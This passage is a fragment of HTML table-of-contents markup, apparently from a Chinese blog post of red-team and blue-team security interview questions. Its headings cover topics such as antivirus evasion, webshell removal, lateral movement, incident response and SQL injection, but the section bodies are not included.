class="toc-number">1.14.1.4.</span> <span class="toc-text">DNS查询&#x2F;枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTPS%E8%AF%81%E4%B9%A6"><span class="toc-number">1.14.1.5.</span> <span class="toc-text">HTTPS证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%BC%E5%90%88%E6%90%9C%E7%B4%A2"><span class="toc-number">1.14.1.6.</span> <span class="toc-text">综合搜索</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E7%AD%9B%E9%80%89"><span class="toc-number">1.14.1.7.</span> <span class="toc-text">子域名筛选</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">1.14.1.8.</span> <span class="toc-text">相关域名收集</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%81%E7%AB%99%E5%8F%8Ac%E6%AE%B5%E6%94%B6%E9%9B%86"><span class="toc-number">1.14.1.8.1.</span> <span class="toc-text">旁站及c段收集</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.14.1.8.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%BB%E7%AB%99%E6%8F%90%E5%8F%96"><span class="toc-number">1.14.1.8.3.</span> <span class="toc-text">主站提取</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A7%BB%E5%8A%A8%E7%AB%AF"><span class="toc-number">1.14.1.8.4.</span> <span class="toc-text">移动端</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%A1%8C%E4%B8%9A%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.14.1.8.5.</span> <span class="toc-text">行业系统</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E4%BA%86%E8%A7%A3%E8%BF%87%E5%A4%9A%E5%B0%91"><span class="toc-number">1.15.</span> <span class="toc-text">免杀了解过多少</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E5%85%8D%E6%9D%80"><span class="toc-number">1.15.1.</span> <span class="toc-text">powershell免杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%96%B9%E6%B3%95"><span class="toc-number">1.15.1.1.</span> <span class="toc-text">免杀方法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97%E6%8B%86%E5%88%86%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">1.15.1.1.1.</span> <span class="toc-text">使用关键字拆分进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fuzz%E6%80%9D%E6%83%B3%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">1.15.1.1.2.</span> <span class="toc-text">Fuzz思想进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B6%85%E9%95%BF%E5%91%BD%E4%BB%A4bypass"><span class="toc-number">1.15.1.1.3.</span> <span class="toc-text">超长命令bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8copy%E5%91%BD%E4%BB%A4%E8%BF%9B%E8%A1%8Cbypass"><span class="toc-number">1.15.1.1.4.</span> <span class="toc-text">使用copy命令进行bypass</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B7%B7%E5%90%88bypass"><span class="toc-number">1.15.1.1.5.</span> <span class="toc-text">混合bypass</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E6%AD%BB%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="toc-number">1.16.</span> <span class="toc-text">不死马查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#root%E7%94%A8%E6%88%B7%E8%A7%92%E5%BA%A6%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">1.16.1.</span> <span class="toc-text">root用户角度的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%80%E6%8E%89%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.16.1.1.</span> <span class="toc-text">杀掉进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E7%9A%84%E6%9F%A5%E6%9D%80"><span class="toc-number">1.16.1.2.</span> <span class="toc-text">其他用户的查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%80%E6%8E%89%E8%BF%9B%E7%A8%8B%EF%BC%9A"><span class="toc-number">1.16.1.2.1.</span> <span class="toc-text">杀掉进程：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">1.16.1.2.2.</span> <span class="toc-text">条件竞争:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E5%87%BA%E6%9D%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC-%E6%B2%A1%E6%9C%89%E6%97%A5%E5%BF%97%E6%80%8E%E4%B9%88%E6%89%BE"><span class="toc-number">1.17.</span> <span class="toc-text">排查出来一句话木马,没有日志怎么找</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95"><span class="toc-number">1.17.1.</span> <span class="toc-text">检查网站目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8PHP%E7%9A%84-%E5%8A%9F%E8%83%BD"><span class="toc-number">1.17.2.</span> <span class="toc-text">利用PHP的 功能</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%BD%91%E7%BB%9C%E6%B5%81%E9%87%8F"><span class="toc-number">1.17.3.</span> <span class="toc-text">检查网络流量</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%AB%E4%BA%BA%E5%B7%B2%E7%BB%8F%E5%B0%86%E6%9C%A8%E9%A9%AC%E4%BC%A0%E5%88%B0%E4%B8%BB%E6%9C%BA%E6%97%B6-%E6%80%8E%E4%B9%88%E6%8E%92%E6%9F%A5"><span class="toc-number">1.18.</span> <span class="toc-text">别人已经将木马传到主机时,怎么排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%BA%AF%E6%BA%90"><span class="toc-number">1.19.</span> <span class="toc-text">如何溯源</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E4%B8%80"><span class="toc-number">1.19.1.</span> <span class="toc-text">答案一:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E4%BA%8C"><span class="toc-number">1.19.2.</span> <span class="toc-text">答案二</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%92%88%E5%AF%B9-ip-%E6%BA%AF%E6%BA%90%E4%B8%80%E4%BA%8C"><span class="toc-number">1.19.2.1.</span> <span class="toc-text">针对 ip 溯源一二</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9D%A5%E8%87%AA%E5%88%9B%E5%AE%87%E7%9B%BE%E7%AD%89%E8%8A%82%E7%82%B9%E7%9A%84%E6%B5%81%E9%87%8F-ip"><span class="toc-number">1.19.2.2.</span> <span class="toc-text">来自创宇盾等节点的流量 ip</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#whois-%E5%9F%9F%E5%90%8D%E5%8F%8D%E6%9F%A5"><span class="toc-number">1.19.2.3.</span> <span class="toc-text">whois 域名反查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%AB%AF%E5%8F%A3-%E6%9C%8D%E5%8A%A1-%E8%BF%9B%E8%A1%8C%E5%8F%8D%E6%B8%97%E9%80%8F"><span class="toc-number">1.19.2.4.</span> <span class="toc-text">探测端口 服务 进行反渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5"><span class="toc-number">1.19.2.5.</span> <span class="toc-text">威胁情报</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1-qq-%E6%89%8B%E6%9C%BA%E5%8F%B7-%E7%A4%BE%E5%B7%A5%E5%BA%93"><span class="toc-number">1.19.2.6.</span> <span class="toc-text">邮箱 qq 手机号 社工库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#qq-%E5%BE%AE%E4%BF%A1-%E6%8A%96%E9%9F%B3-%E9%99%8C%E9%99%8C-%E7%AD%89%E6%8E%A5%E5%8F%A3"><span class="toc-number">1.19.2.7.</span> <span class="toc-text">qq 微信 抖音 陌陌 等接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ga-%E6%95%B0%E6%8D%AE-%E8%BF%90%E8%90%A5%E5%95%86%E6%95%B0%E6%8D%AE"><span class="toc-number">1.19.2.8.</span> <span class="toc-text">ga 数据 运营商数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B%E8%AE%BE%E5%A4%87%E5%92%8C%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E8%AE%BE%E5%A4%87%E5%8F%91%E7%94%9F%E6%8A%A5%E8%AD%A6%EF%BC%8C%E5%AF%B9%E8%AD%A6%E5%91%8A%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%8C%E8%AE%B2%E4%B8%80%E4%B8%8B%E4%BD%A0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E5%92%8C%E4%B8%8A%E6%9C%BA%E6%8E%92%E6%9F%A5%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">1.20.</span> <span class="toc-text">流量检测设备和态势感知设备发生报警，对警告进行分析，讲一下你流量分析和上机排查的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E4%B8%80%E4%B8%8B%E6%98%AF%E5%90%A6%E6%98%AF%E8%AF%AF%E6%8A%A5"><span class="toc-number">1.20.1.</span> <span class="toc-text">排查一下是否是误报</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E4%B8%BB%E6%9C%BA%E4%B8%8A%E9%9D%A2%E6%98%AF%E5%90%A6%E6%9C%89%E5%85%B6%E4%BB%96%E7%9A%84%E5%91%8A%E8%AD%A6%E6%83%85%E5%86%B5"><span class="toc-number">1.20.2.</span> <span class="toc-text">排查主机上面是否有其他的告警情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E6%9C%BA%E6%8E%92%E6%9F%A5"><span class="toc-number">1.20.3.</span> <span class="toc-text">上机排查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E4%BB%A3%E7%90%86%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5"><span class="toc-number">1.21.</span> <span class="toc-text">ip代理如何排查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.22.</span> <span class="toc-text">域内横向移动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%B8%B8%E7%94%A8%E7%9A%84windows%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5%E5%92%8C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">1.22.1.</span> <span class="toc-text">0x01 常用的windows远程连接和相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-Windoors%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96"><span class="toc-number">1.22.1.1.</span> <span class="toc-text">0x02 Windoors系统散列值获取</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x03-%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB"><span class="toc-number">1.22.1.2.</span> <span class="toc-text">0x03 哈希传递攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x04%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92"><span class="toc-number">1.22.1.3.</span> <span class="toc-text">0x04票据传递</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Webshell%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%B5%81%E7%A8%8B"><span class="toc-number">1.23.</span> <span class="toc-text">Webshell应急响应流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E8%A2%AB%E6%A4%8D%E5%85%A5webshell"><span class="toc-number">1.23.1.</span> <span class="toc-text">判断是否被植入webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E5%A4%84%E7%90%86"><span class="toc-number">1.23.1.1.</span> <span class="toc-text">临时处理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">1.23.2.</span> <span class="toc-text">webshell查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.2.1.</span> <span class="toc-text">Windows系统排查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.2.2.</span> <span class="toc-text">Linux系统排查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.</span> <span class="toc-text">系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5-2"><span class="toc-number">1.23.3.1.</span> <span class="toc-text">Windows系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.1.1.</span> <span class="toc-text">用户信息排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E3%80%81%E6%9C%8D%E5%8A%A1%E3%80%81%E9%A9%B1%E5%8A%A8%E3%80%81%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.1.2.</span> <span class="toc-text">进程、服务、驱动、启动项排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.1.3.</span> <span class="toc-text">网络连接排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.1.4.</span> <span class="toc-text">任务计划排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.1.5.</span> <span class="toc-text">文件排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.2.</span> <span class="toc-text">linux系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.2.1.</span> <span class="toc-text">账户排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">1.23.3.2.2.</span> <span class="toc-text">入侵排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.23.3.3.</span> <span class="toc-text">历史命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-bash-history%E6%9F%A5%E7%9C%8B%E5%B8%90%E5%8F%B7%E6%89%A7%E8%A1%8C%E8%BF%87%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.23.3.3.1.</span> <span class="toc-text">通过.bash_history查看帐号执行过的系统命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.23.3.4.</span> <span class="toc-text">检查异常端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.23.3.5.</span> <span class="toc-text">检查异常进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">1.23.3.6.</span> <span class="toc-text">检查开机启动项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.23.3.7.</span> <span class="toc-text">检查定时任务</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">1.23.3.7.1.</span> <span class="toc-text">基本命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-2"><span class="toc-number">1.23.3.7.2.</span> <span class="toc-text">入侵排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.23.3.8.</span> <span class="toc-text">检查服务</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-3"><span class="toc-number">1.23.3.8.1.</span> <span class="toc-text">入侵排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">1.23.3.8.2.</span> <span class="toc-text">服务器自启动</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6"><span class="toc-number">1.23.3.9.</span> <span class="toc-text">检查异常文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">1.23.3.10.</span> <span class="toc-text">检查系统日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6-%E6%89%BE-php%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6"><span class="toc-number">1.23.3.11.</span> <span class="toc-text">检查异常文件,找.php后缀文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97-2"><span class="toc-number">1.23.3.12.</span> <span class="toc-text">检查系统日志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%94%A8%E8%BF%87%E5%90%97"><span class="toc-number">1.24.</span> <span class="toc-text">网络空间搜索引擎用过吗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FOFA"><span class="toc-number">1.24.1.</span> <span class="toc-text">FOFA</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E7%94%A8%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7%E9%85%8D%E5%90%88xss%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9D%83%E9%99%90"><span class="toc-number">1.25.</span> <span class="toc-text">怎么用渗透工具配合xss攻击获取服务器权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%96%E7%9F%BF"><span class="toc-number">1.25.1.</span> <span class="toc-text">挖矿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91"><span class="toc-number">1.25.2.</span> <span class="toc-text">内网</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5"><span class="toc-number">1.25.3.</span> <span class="toc-text">JNDI注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNI%E6%B3%A8%E5%85%A5"><span class="toc-number">1.25.4.</span> <span class="toc-text">JNI注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JSTL%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.25.5.</span> <span class="toc-text">JSTL任意文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro"><span class="toc-number">1.25.6.</span> <span class="toc-text">shiro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%BE%97%E4%BA%86etc-passwd%E6%96%87%E4%BB%B6%E4%B9%8B%E5%90%8E%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8"><span class="toc-number">1.26.</span> <span class="toc-text">获得了etc&#x2F;passwd文件之后如何利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.27.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC%E6%9F%A5%E6%9D%80"><span class="toc-number">1.28.</span> <span class="toc-text">java内存马查杀</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E7%89%B9%E5%BE%81%E7%9A%84%E8%AF%86%E5%88%AB"><span class="toc-number">1.28.1.</span> <span class="toc-text">内存马特征的识别</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E7%89%B9%E6%AE%8A%E5%90%8D%E7%A7%B0"><span class="toc-number">1.28.1.1.</span> <span class="toc-text">filter特殊名称</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#filter%E4%BC%98%E5%85%88%E7%BA%A7"><span class="toc-number">1.28.1.2.</span> <span class="toc-text">filter优先级</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-xml%E4%B8%AD%E6%B2%A1%E6%9C%89filter%E9%85%8D%E7%BD%AE"><span class="toc-number">1.28.1.3.</span> <span class="toc-text">web.xml中没有filter配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8Aclassloader%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.28.1.4.</span> <span class="toc-text">特殊classloader加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Filter%E7%9A%84doFilter%E6%96%B9%E6%B3%95%E4%B8%AD%E6%9C%89%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81"><span class="toc-number">1.28.1.5.</span> <span class="toc-text">Filter的doFilter方法中有恶意代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E5%A4%A7%E7%B1%BB"><span class="toc-number">1.28.2.</span> <span class="toc-text">三大类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E7%AE%80%E8%BF%B0"><span class="toc-number">1.28.3.</span> <span class="toc-text">原理简述</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#servlet-api%E7%B1%BB"><span class="toc-number">1.28.3.1.</span> <span class="toc-text">servlet-api类</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E8%BE%B9%E7%BC%98%E4%B8%9A%E5%8A%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F%E8%BF%87%E5%90%97"><span class="toc-number">1.29.</span> <span class="toc-text">对边缘业务小程序渗透过吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E9%95%9C%E5%83%8F%E5%8A%AB%E6%8C%81%E7%9A%84%E4%BA%86%E8%A7%A3"><span class="toc-number">1.30.</span> <span class="toc-text">对镜像劫持的了解</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">蓝队初级面试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#TOP10"><span class="toc-number">2.1.</span> <span class="toc-text">TOP10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#01-%E5%BD%93%E4%BD%A0%E5%8F%91%E7%8E%B0%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E6%9C%89CDN%E7%9A%84%E6%97%B6%E5%80%99%E5%BA%94%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">2.2.</span> <span class="toc-text">01.当你发现这个网站有CDN的时候应该怎么办?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#02-%E5%AF%B9%E5%93%AA%E4%BA%9B%E8%AF%AD%E8%A8%80%E6%AF%94%E8%BE%83%E4%BA%86%E8%A7%A3%EF%BC%9F"><span class="toc-number">2.3.</span> <span class="toc-text">02.对哪些语言比较了解？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#03-sql%E6%B3%A8%E5%85%A5%E9%9C%80%E8%A6%81%E6%BB%A1%E8%B6%B3%E4%BB%80%E4%B9%88%E6%9D%A1%E4%BB%B6%EF%BC%9F"><span class="toc-number">2.4.</span> <span class="toc-text">03.sql注入需要满足什么条件？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#04-sql%E6%B3%A8%E5%85%A5%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E7%B1%BB%E5%9E%8B%EF%BC%9F"><span class="toc-number">2.5.</span> <span class="toc-text">04.sql注入有哪几种类型？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#05-%E7%AE%80%E5%8D%95%E8%AE%B2%E4%B8%80%E4%B8%8B%E9%98%B2%E8%8C%83SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E6%96%B9%E6%B3%95%E5%92%8C%E5%8E%9F%E7%90%86"><span class="toc-number">2.6.</span> <span class="toc-text">05.简单讲一下防范SQL注入的方法和原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#06-%E4%BD%A0%E5%9C%A8%E8%BF%9B%E8%A1%8Csql%E6%B3%A8%E5%85%A5%E6%97%B6%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%9C%89waf-%E8%AF%A5%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">2.7.</span> <span class="toc-text">06.你在进行sql注入时，发现有waf,该怎么办？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.7.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.7.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">2.7.3.</span> <span class="toc-text">应用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#waf%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.3.1.</span> <span class="toc-text">waf绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#07-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8D%B1%E5%AE%B3%EF%BC%9F"><span class="toc-number">2.8.</span> <span 